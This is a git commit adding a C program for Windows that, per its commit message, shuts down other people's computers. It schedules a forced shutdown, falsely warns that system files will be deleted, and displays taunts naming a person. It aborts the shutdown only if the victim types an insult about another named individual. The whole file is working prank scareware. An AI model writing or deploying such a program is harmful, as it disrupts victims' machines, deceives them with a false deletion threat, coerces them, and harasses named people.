831a656df904eeab4333a3e419d9b8045fb815fd
Davy <945825394@qq.com>
2022-07-28 16:30:43 +0800

    made a exe that can shut others' computer down.

---
+++ Force Shutdown/Force Shutdown/Force Shutdown.c
@@ -0,0 +1,86 @@
+#define _CRT_SECURE_NO_WARNINGS
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <Windows.h>
+
+
+void DAVYISAGOD()
+{
+	system("cls");
+	char arr1[] = "于晓宇是你爸爸哇咔咔咔咔咔咔咔咔咔咔咔";
+	char arr2[] = "**************************************";
+	int left = 0;
+	int right = strlen(arr1) - 1;
+	printf("******************");
+	printf("%s", arr2);
+	printf("******************\n");
+	printf("******************");
+	printf("%s", arr2);
+	printf("******************\n");
+	printf("******************");
+	printf("%s", arr2);
+	printf("******************\n");
+	printf("******************");
+	printf("%s", arr2);
+	printf("******************\n");
+	printf("******************");
+	printf("%s", arr2);
+	printf("******************\n");
+	Sleep(1000);
+	system("cls");
+	while (left - right <= 1)
+	{
+		arr2[left] = arr1[left];
+		arr2[right] = arr1[right];
+		left++;
+		right--;
+		arr2[left] = arr1[left];
+		arr2[right] = arr1[right];
+		left++;
+		right--;
+		printf("******************");
+		printf("%s", arr2);
+		printf("******************\n");
+		printf("******************");
+		printf("%s", arr2);
+		printf("******************\n");
+		printf("******************");
+		printf("%s", arr2);
+		printf("******************\n");
+		printf("******************");
+		printf("%s", arr2);
+		printf("******************\n");
+		printf("******************");
+		printf("%s", arr2);
+		printf("******************\n");
+		if (left - right > 1)
+			continue;
+		Sleep(1000);
+		system("cls");
+	}
+}
+
+int main()
+{
+
+	system("shutdown -s -t 60");
+	printf("请注意电脑将在一分钟内关机\n同时删除部分你“可能”不需要的系统文件，若不想操作，请输入：梅佳琪是猪\n");
+	Sleep(5000);
+	DAVYISAGOD();
+	Sleep(2000);
+
+again:
+	printf("再次提示您：请注意电脑将在一分钟内关机\n同时删除部分你“可能”不需要的系统文件，若不想操作，请输入：梅佳琪是猪\n");
+	char tmp[20] = { 0 };
+	scanf("%s", tmp);
+	if (strcmp(tmp, "梅佳琪是猪") == 0)
+	{
+		system("shutdown -a");
+	}
+	else
+	{
+		goto again;
+	}
+	return 0;
+}
